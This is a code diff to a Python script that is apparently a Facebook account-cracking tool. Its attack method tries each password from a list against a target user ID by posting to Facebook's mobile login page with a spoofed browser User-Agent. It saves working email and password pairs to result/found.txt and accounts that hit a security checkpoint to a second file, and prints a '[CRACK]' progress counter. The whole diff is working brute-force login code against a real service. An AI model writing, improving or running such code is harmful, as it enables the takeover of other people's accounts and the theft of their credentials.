@@ -11,21 +11,21 @@ class AutoB:
 		self.u='https://graph.facebook.com/{}'
 		self.main()
 
-	def attk(self,id):
+	def attk(self,idd):
 		try:
-			self.autop(id)
-			for xi in self.lid:
-				data={'email':id,'pass':xi}
+			self.autop(idd)
+			for x in self.lid:
+				data={'email':idd,'pass':x,'login':'submit'}
 				head={'User-Agent':'Mozilla/5.0 (Linux; Android 4.4.2; Nexus 4 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.114 Mobile Safari/537.36'}
-				re=self.req.post('https://mbasic.facebook.com/login',data=data,headers=head)
-				if 'save-device' in str(re.content) or 'm_sess' in str(re.content):
+				re=requests.post('https://mbasic.facebook.com/login',data=data,headers=head).text
+				if 'save-device' in re or 'm_sess' in re:
 					pen=open('result/found.txt','a')
-					pen.write(f'{id}|{xi}\n')
+					pen.write(f'{idd}|{x}\n')
 					self.fnd.append('ntaps')
 					break
-				elif 'checkpoint' in str(re.content):
+				elif 'checkpoint' in re:
 					pen=open('result/cek.txt','a')
-					pen.write(f'{id}|{xi}\n')
+					pen.write(f'{idd}|{x}\n')
 					self.cek.append('yaudah gpp')
 					break
 			print(f'\r[CRACK] >> {self.hit}/{len(self.file)} F[{len(self.fnd)}] CP[{len(self.cek)}] <<',end='');sys.stdout.flush()
